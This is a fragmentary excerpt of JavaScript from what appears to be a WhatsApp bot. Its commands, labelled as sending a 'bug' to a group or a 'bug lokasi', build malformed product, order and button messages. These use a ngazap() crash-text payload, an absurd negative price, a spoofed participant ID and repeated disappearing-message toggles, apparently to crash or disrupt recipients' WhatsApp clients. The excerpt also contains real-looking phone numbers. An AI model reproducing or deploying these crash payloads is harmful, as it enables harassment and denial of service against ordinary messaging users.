...
"productMessage": {
						"product": {
							...
							"title": "𝑯𝑾 𝑴??𝑫𝑺 𝑾𝑨 🔥",
							"description": `©[𝑿𝑴]-𝑿𝑯𝑰𝑹𝑶 𝑴𝑯𝑶𝑵𝑺𝑯𝑰𝑵𝑬さ${ngazap(prefix)}`,
							"currencyCode": "IDR",
							"itemCount": oi2,
							                    "message": oi1,
...
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/At_3CVdn_pLL5CDwWheaf8lgK0g2wxhgNQNRzUoNwrMJ.enc",
						"mimetype": "image/jpeg",
						"fileSha256":  "qwDbC5KKMxiSn4HYxAEbl1r7rhpYdsv00Al9vodeOyY=",
						"fileLength": "47173",
						"height": 554,
						"width": 554,
						"mediaKey": "VGBRjfNqSxpjP9mqcfHzpYFYll0JsjNjUGlURgftcRI=",
						"fileEncSha256": "+8Pb44q5iuIjXDXoc3DYDFMtFREGGXBT7XVC7Wtfaik=",
						"directPath": "/v/t62.7118-24/21578257_160622532957532_6085646643783821362_n.enc?ccb=11-4&oh=01_AVx6z9Gi-IxxCc2qvf42FATj8dzHAr7z-kp39fxqDd0enw&oe=61FB7A0F",
						"mediaKeyTimestamp": "1641404883"
					 },
...
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
await Haikal.relayWAMessage(Haikal.prepareMessageFromContent(from, Haikal.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
        freply(` ⊷️「Success 」Mengirim Bug Di ${groupName}`);
        break
// Bug Lokasi
case 'buglokasi':
if (isBan) return reply(mess.ban)
...
"priceAmount1000": "-9999999999,",
   ...
   key: {
				   fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6282284348289@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
						...
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "{ ᔐ ꪶꪶ ⃯⃗𔕔҉🇮🇩༑ᴱˣᵀᴱᴿᴺᴬᴸ༑🇮🇩҉𔕔⃯⃗ ꫂꫂ ᔐ }",
						"orderTitle": "㐫 𝑿𝑯𝑰𝑹𝑶 𝑴𝑯𝑶𝑵𝑺𝑯𝑰𝑵𝑬 ㆗",
						"sellerJid": "6282316214501@s.whatsapp.net",
						"token": "AR4QUhFw+h1LZ12vhHfwuTERPsafiuswmzZ57NXy2XGo8Q=="
					}}}})
Haikal.relayWAMessage(res)
break
